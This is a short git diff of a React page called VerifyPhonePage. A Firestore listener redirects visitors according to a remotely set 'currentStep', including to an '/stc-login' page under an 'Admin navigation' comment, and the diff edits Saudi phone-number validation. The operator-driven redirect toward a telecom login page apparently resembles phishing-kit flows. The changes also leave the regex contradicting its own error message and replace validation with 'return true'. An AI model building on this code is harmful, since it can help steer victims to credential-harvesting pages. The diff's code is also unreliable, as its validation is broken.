@@ -84,9 +84,9 @@ export default function VerifyPhonePage() {
           console.log("Firestore data received:", data);
           if (data.currentStep === "stc-login") {
             window.location.href = "/stc-login";
-          }else
+          }
           // Admin navigation: Handle page redirects
-          if (data.currentStep === "home") {
+          else if (data.currentStep === "home") {
             console.log("[phone-info] Admin redirecting to home");
             window.location.href = "/";
           } else if (data.currentStep === "phone") {
@@ -138,7 +138,7 @@ export default function VerifyPhonePage() {
     const cleanPhone = phone.replace(/\s/g, "");
 
     // Saudi phone number validation: starts with 05 and 10 digits total
-    const saudiPhoneRegex = /^05\d{8}$/;
+    const saudiPhoneRegex = /^5\d{8}$/;
 
     if (!saudiPhoneRegex.test(cleanPhone)) {
       setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
@@ -166,7 +166,8 @@ export default function VerifyPhonePage() {
     if (value.length <= 10) {
       setPhoneNumber(value);
       if (value.length === 10) {
-        validatePhoneNumber(value);
+        //validatePhoneNumber(value);
+        return true;
       } else {
         setPhoneError("");
       }
